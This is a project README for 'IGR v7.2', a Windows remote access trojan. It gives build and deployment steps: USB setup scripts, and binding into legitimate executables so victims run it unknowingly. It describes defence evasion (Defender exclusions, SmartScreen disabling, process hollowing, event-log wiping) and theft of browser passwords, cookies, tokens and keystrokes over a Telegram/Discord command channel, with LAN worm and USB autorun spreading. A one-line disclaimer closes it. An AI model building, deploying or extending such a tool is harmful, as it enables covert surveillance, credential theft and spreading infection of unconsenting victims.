# IGR v7.2

<p align="center"><img src="files/logos/igr-logo2.png" width="200"></p>

Silent auto-start remote access tool for Windows. Deploys via USB stick or EXE binding, starts before login, and exposes a full-featured web dashboard through a Cloudflared tunnel.

---

## Table of Contents

- [Installation Guide](#installation-guide)
- [Configuration](#configuration)
- [Building](#building)
- [Deploy via USB](#deploy-via-usb)
- [EXE Bind Mode](#exe-bind-mode)
- [Self-Update](#self-update)
- [Panic / Self-Destruct](#panic--self-destruct)
- [Cleanup](#cleanup)
- [Telegram Commands](#telegram-commands)
- [Features](#features)
- [Project Structure](#project-structure)
- [Disclaimer](#disclaimer)

---

## Installation Guide

### Prerequisites

- **Windows 10/11** (target and build machine)
- **Python 3.8–3.11** (for building only - the compiled exe runs standalone on the target)
- **Git** (to clone the repo)
- **Internet connection** (for cloudflared tunnel and Telegram/Discord)

### Step 1: Install Git

Download and install Git for Windows:

```
https://git-scm.com/download/win
```

Or via winget:
```batch
winget install Git.Git
```

### Step 2: Install Python

Download Python 3.11 from:

```
https://www.python.org/downloads/release/python-3119/
```

> **Important:** During installation, check **"Add Python to PATH"**.

Or via winget:
```batch
winget install Python.Python.3.11
```

Verify installation:
```batch
python --version
git --version
```

### Step 3: Clone the Repository

```batch
git clone https://github.com/whoevenisxeno/IGR.git
cd IGR
```

### Step 4: Build

```batch
build.bat
```

This will ask for:
1. **Injection method** - USB Stick or EXE Bind
2. **EXE icon** - Python default, blank, or IGR logo
3. **Configuration** - Discord webhook, Telegram bot token, dashboard password, etc.

Then it installs dependencies, downloads cloudflared, compiles with PyInstaller, and deploys.

Output: `dist\igr_v7.2.exe` (USB) or `dist\<target_name>.exe` (bind)

---

## Configuration

All configuration is entered when you run `build.bat` - no config files needed.

| Prompt | Required | Description |
|--------|----------|-------------|
| Discord Webhook URL | Yes* | Discord webhook URL for notifications |
| Discord Bot Name | No | Bot display name (default: IGR) |
| Dashboard Password | No | Password for web dashboard |
| Telegram Bot Token | Yes* | Bot token from @BotFather |
| Telegram Chat ID | Yes* | Your chat ID from @userinfobot |
| Self-Update URL | No | URL for self-update feature |

\* At least one of Telegram or Discord is required.

---

## Building

```batch
build.bat
```

Build.bat will:
- Ask for injection method: USB Stick or EXE Bind
- Ask for exe icon: Python default, blank, or IGR logo
- Ask for credentials (Discord webhook, Telegram token, dashboard password, etc.)
- Inject credentials into a build copy of files/main.py
- Install all Python dependencies
- Download cloudflared.exe if not present
- Build with PyInstaller → `dist\igr_v7.2.exe`
- USB mode: detect plugged-in USB drives and offer to wipe+deploy or add IGR alongside existing files
- EXE Bind mode: compile stub dropper, ask for target exe, bind stub+target+IGR into single exe

---

## Deploy via USB

1. Run `build.bat` - it handles USB detection and file placement
2. Plug USB into target PC, double-click `setup.bat`
3. IGR installs silently and starts immediately - no visible windows

**What happens on the target:**
- `setup.bat` requests admin (UAC prompt) - if denied, continues with limited privileges
- Copies `igr.exe` → `%APPDATA%\Microsoft\WindowsRuntime\winruntime.exe`
- Creates invisible VBS launcher
- Adds startup shortcut (works without admin)
- If admin: creates scheduled task (starts before login), disables SmartScreen, adds Defender exclusions
- Launches immediately via `wscript.exe`
- You receive a Telegram message / Discord webhook with the dashboard URL

**No admin?** Still works. You just lose: boot-time start, Defender exclusions, SmartScreen bypass.

---

## EXE Bind Mode

Instead of USB deployment, IGR can be merged into any legitimate `.exe` file. When the victim opens it, they see the real program while IGR installs silently.

### How it works
1. `build.bat` → choose method **[2] EXE Bind**
2. Drag and drop a legitimate `.exe` into the terminal (e.g. a game installer, utility)
3. `files/stub.py` is compiled into a dropper, `files/binder.py` merges all three into one exe
4. The bound exe has this format:
   ```
   [stub.exe][legit.exe][igr.exe][legit_size:8][igr_size:8][IGR_BIND magic]
   ```
5. When opened, the stub:
   - Extracts the legitimate exe to temp and launches it (user sees the real program)
   - Installs IGR to `%APPDATA%\Microsoft\WindowsRuntime\winruntime.exe`
   - Adds registry persistence (HKCU Run key)
   - Launches IGR silently in the background

### Files
- `files/stub.py` — Dropper/loader that extracts and runs both payloads
- `files/binder.py` — Merges stub + legit exe + IGR exe into bound output

---

## Self-Update

Set `UPDATE_URL` in config to a direct download link hosting the new `.exe`. Click "Update from configured URL" on the Remote page - IGR downloads the new exe, kills itself, swaps the file, and restarts.

---

## Panic / Self-Destruct

Click the red PANIC button on the Stealth page. Double confirmation. Removes:
- Registry Run key
- Scheduled task
- Startup shortcuts
- All 4 internal spread copies
- Keylog directory + marker (securely overwritten)
- Telegram state + watchdog script
- Defender exclusions
- Marks Telegram offline, then kills all IGR processes

---

## Cleanup

Run `files/cleanup.bat` on the target machine to remove all traces manually.

---

## Telegram Commands

All commands are sent in your Telegram chat with the bot:

| Command | Description |
|---------|-------------|
| `/help` | List all commands |
| `/info` | System info (hostname, user, OS, IP) |
| `/screen` | Take screenshot |
| `/webcam` | Take webcam photo |
| `/keylog` | Send keylog file |
| `/wifi` | Dump WiFi passwords |
| `/shell <cmd>` | Run shell command |
| `/download <url\|file>` | Download+run URL, or send local file |
| `/upload <path>` | Upload file to host |
| `/cd <path>` | Change directory (supports `../`) |
| `/ls` | List current directory |
| `/proc` | List running processes |
| `/kill <pid>` | Kill process by PID |
| `/volume <0-100>` | Set system volume |
| `/notify <text>` | Show Windows notification |
| `/reboot` | Reboot machine |
| `/shutdown` | Shutdown machine |
| `/panic` | Self-destruct |
| `/url` | Get dashboard URL |
| `/chrome` | Chrome saved passwords |
| `/firefox` | Firefox saved passwords |
| `/autofill` | Browser autofill data |
| `/discord` | Discord tokens |
| `/steam` | Steam session data |
| `/minecraft` | Minecraft launcher tokens |
| `/spotify` | Spotify credentials |
| `/git` | Git credentials |
| `/clipboard` | Clipboard content |
| `/history` | Browser history |
| `/network` | Network info + LAN scan |
| `/connections` | Live TCP/UDP connections |
| `/usb` | USB device history |
| `/sysinfo` | Detailed system info |
| `/startup` | Startup programs |
| `/tasks` | Scheduled tasks |
| `/disks` | Disk drives |
| `/lock` | Lock screen |
| `/logoff` | Log off user |
| `/hibernate` | Hibernate |
| `/speak <text>` | Text to speech |
| `/speak` | Send audio file to play |
| `/wallpaper` | Send image to set as wallpaper |
| `/browser <url>` | Open URL in browser |
| `/status` | Quick status |
| `/mic [secs]` | Record microphone |
| `/geo` | Geo location from IP |
| `/apps` | Installed applications |
| `/spread` | Trigger internal spread |
| `/safemode` | Safe Mode persistence |
| `/wipelogs` | Wipe event logs |
| `/hollow [process]` | Process hollowing |
| `/cancel` | Cancel pending file upload |

---

## Features

### Core
- **Silent deployment** - No console, no visible windows, auto-starts at boot via Scheduled Task + Registry + Startup folder
- **Web dashboard** - Dark purple/black UI with responsive grid layout, accessible from any browser via Cloudflared tunnel URL
- **No admin required** - Falls back gracefully if UAC denied; core infection works with standard user
- **Watchdog** - Monitors process and restarts if killed

### Remote Access
- **Screen streaming** - Live screen capture with multi-monitor support
- **Webcam streaming** - Live webcam feed with device selection
- **Remote control** - Mouse and keyboard control from dashboard
- **Command shell** - Execute system commands remotely with output display
- **File browser** - Browse, download, upload files; image thumbnail previews; upload to arbitrary path with auto-execute
- **Upload to victim** - Upload files to specific paths on the target, optionally execute after upload

### Data Harvesting
- **Keylogger** - Global keystroke logging with XOR-encrypted storage, auto-sends last session on startup
- **WiFi passwords** - Dump all saved WiFi profiles and keys
- **Chrome/Edge passwords** - Decrypt saved passwords from Chrome and Edge
- **Firefox passwords** - Decrypt saved passwords from Firefox via NSS
- **Browser autofill** - Extract Chrome/Edge autofill data and profile info
- **Browser cookies** - Steal browser cookies
- **Browser history** - Extract Chrome/Edge browsing history
- **Discord tokens** - Extract Discord, Canary, PTB client tokens
- **Steam session** - Extract Steam config, SSFN files, login users
- **Minecraft tokens** - Extract launcher accounts and MSAL tokens
- **Spotify credentials** - Extract stored Spotify login data
- **Git credentials** - Extract .gitconfig, .git-credentials, _netrc, credential manager
- **Network connections** - Live TCP/UDP connection table with PID→process mapping
- **USB device history** - Enumerate previously connected USB devices from registry
- **Clipboard** - Read current clipboard content
- **Installed software** - List all installed applications
- **Recent documents** - List recently accessed files
- **Full system inventory** - Hardware, OS, network adapters, disk drives, startup programs, scheduled tasks
- **Microphone recording** - Record audio from target's mic

### Telegram Bot
- **Multi-PC tracking** - One message per machine with active/offline status, auto-cleanup of old messages on restart
- **Heartbeat** - Edits existing message every 5 minutes with updated "Last Seen" time
- **Offline detection** - Marks offline on clean shutdown via `atexit`; deletes old messages before sending fresh ones on crash recovery
- **Full command set** - 30+ commands for remote control, data exfil, and trolling
- **File upload** - Send images for wallpaper, audio for TTS via Telegram
- **Keylog delivery** - Automatically sends encrypted keylog file on startup

### Discord Notifications
- **Webhook URL post** - Sends dashboard URL on startup

### Injection & Spreading
- **USB stick deployment** - Classic manual deploy via USB with files/setup.bat
- **EXE bind mode** - Merge IGR into any legitimate .exe - victim sees the real program, IGR installs silently
- **USB autorun** - Copy IGR to all USB drives with autorun.inf + VBS launcher + hidden shortcut
- **LAN worm** - Scan subnet, attempt SMB copy to C$/ADMIN$ shares with startup persistence
- **Internal spread** - 4 hidden copies in AppData/ProgramData with VBS launchers

### Stealth
- **Encrypted keylog** - XOR encryption with key, auto-decrypt on download
- **Secure delete** - Panic overwrites files 3x with random data before deletion
- **Random Flask port** - Avoids predictable port signatures
- **Process name spoofing** - PEB modification to appear as `svchost.exe`
- **Process hollowing** - Launch IGR inside a suspended legitimate process (svchost, explorer, dllhost, ctfmon, taskhostw)
- **Service persistence** - Install as Windows Service for pre-login startup
- **Safe Mode persistence** - Register in SafeBoot keys so IGR runs even in Safe Mode
- **Wipe event logs** - Clear Security, System, Application and all other event logs
- **Event log manipulation** - List, clear, query specific event logs and event IDs
- **Timestamp manipulation** - Modify file created/modified/accessed timestamps via SetFileTime API
- **Steganography** - LSB encode/decode to hide secret data inside images
- **WebRTC leak prevention** - Nullifies RTCPeerConnection in dashboard
- **Registry persistence** - HKCU Run key for auto-start
- **Scheduled task** - Runs as SYSTEM at boot (with admin)
- **Hidden files + directories** - All IGR files marked hidden
- **Fake IIS headers** - Flask responses mimic IIS server

### Troll / Prank
- **Popups** - Normal, persistent (uncloseable), and hydra (spawns 2 more on close)
- **Screen freeze** - Black overlay or custom image, covers entire screen
- **Fake BSOD** - Fullscreen HTA with realistic Windows blue screen (no window chrome, cursor hidden)
- **Fake Windows Update** - Fullscreen HTA with "Working on updates" screen
- **Text-to-speech** - Speak custom text through target's speakers
- **Audio playback** - Upload and play audio files
- **Mouse jitter** - Random mouse movements (start/stop)
- **Ghost typing** - Type text automatically on target's keyboard
- **Wallpaper change** - Set custom desktop wallpaper
- **Monitor on/off** - Turn display on or off
- **Volume control** - Set system volume 0-100
- **Reverse mouse** - Invert mouse direction via registry
- **Swap mouse buttons** - Swap left/right click
- **Hide/show desktop icons** - Toggle desktop icon visibility
- **Hide/show taskbar** - Toggle taskbar visibility
- **Eject/close CD tray** - Physical disc tray control
- **Reboot / shutdown** - Power control with "Windows Update" message

### UI / Dashboard
- **Live status bar** - CPU, RAM, Disk usage + uptime, updates every 5s
- **Mobile FAB** - Floating action button with quick actions on mobile
- **Light/dark theme** - Toggle between dark purple and light purple theme, persisted in localStorage
- **Offline indicator** - Banner + status dot when host connection is lost
- **Color-coded logs** - Activity log entries colored by type (info, success, warn, error)
- **Blinking cursor** - Animated cursor in command output
- **Typing effect** - Animated text output for command responses
- **Image thumbnails** - File browser shows previews for image files
- **Context menu** - Custom right-click menu with common actions
- **Multi-select kill** - Select multiple processes and kill them at once
- **Responsive design** - Collapsible sidebar, mobile-friendly layout

### Panic / Self-Destruct
- **One-click wipe** - Removes all IGR traces: registry, startup, spread copies, keylogs (securely overwritten), watchdog, Defender exclusions, Telegram state
- **Marks offline** - Sends offline notification to Telegram before exiting

---

## Project Structure

```
imagine/
├── build.bat            # Build script (PyInstaller) + USB/EXE bind + deployment
├── README.md            # This file
└── files/
    ├── main.py          # Main application (single file - all backend + dashboard HTML/CSS/JS)
    ├── stub.py          # EXE bind dropper - extracts and runs both payloads
    ├── binder.py        # EXE bind tool - merges stub + legit exe + IGR exe
    ├── setup.bat        # USB deployment / install script (runs on target)
    ├── cleanup.bat      # Remove all traces from target
    ├── save_config.ps1  # Config save/load helper for build.bat
    ├── blank.ico        # Default blank icon for builds
    └── logos/           # Logo assets
```

---
## Disclaimer

This project is for educational and authorized testing purposes only. Unauthorized access to computer systems is illegal. Use responsibly and only on systems you own or have explicit permission to test.
